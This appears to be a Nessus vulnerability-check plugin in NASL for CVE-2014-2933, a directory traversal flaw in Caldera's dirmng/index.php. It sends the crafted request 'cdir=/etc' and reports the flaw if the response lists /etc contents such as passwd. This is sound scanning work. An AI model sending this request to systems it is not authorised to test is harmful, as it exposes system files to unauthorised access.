#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(74325);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_cve_id("CVE-2014-2933");
  script_bugtraq_id(67258);
  script_osvdb_id(106744);
  script_xref(name:"CERT", value:"693092");

  script_name(english:"Caldera 'cdir' Parameter Absolute Path Directory Traversal");
  script_summary(english:"Attempts to access an arbitrary directory.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Caldera installation on the remote host contains a PHP script that
is affected by a directory traversal vulnerability. A remote,
unauthenticated attacker can exploit this issue by sending a crafted
request to the '/dirmng/index.php' script, allowing access to
arbitrary directories on the remote host.

Note that the application is also reportedly affected by a command
injection vulnerability, multiple variable injection vulnerabilities,
and multiple SQL injection vulnerabilities; however, Nessus has not
tested for these issues.");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/05/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:caldera:caldera");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("caldera_web_detect.nbin");
  script_require_keys("www/PHP", "www/caldera_web");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "caldera_web",
  port         : port,
  exit_on_fail : TRUE
);
app = "Caldera";
dir = install["dir"];
install_url = build_url(qs:dir, port:port);

url = "dirmng/index.php?PUBLIC=1&cdir=/etc";

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/" + url,
  exit_on_fail : TRUE
);

if (
  "file=passwd" >< res[2] &&
  "file=resolv.conf" >< res[2] &&
  '<input type="hidden" name="dir" value="/etc"/>' >< res[2]
)
{
  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

    report =
      '\n' + 'Nessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + install_url + url +
      '\n' +
      '\n';
    if (report_verbosity > 1)
    {
      output = strstr(res[2], "file=passwd");
      report +=
        '\n' + 'Nessus was able to access the \'/etc\' directory which produced'+
        '\n' + 'the following truncated output :' +
        '\n' +
        '\n' + snip +
        '\n' + beginning_of_response(resp:output, max_lines:10) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
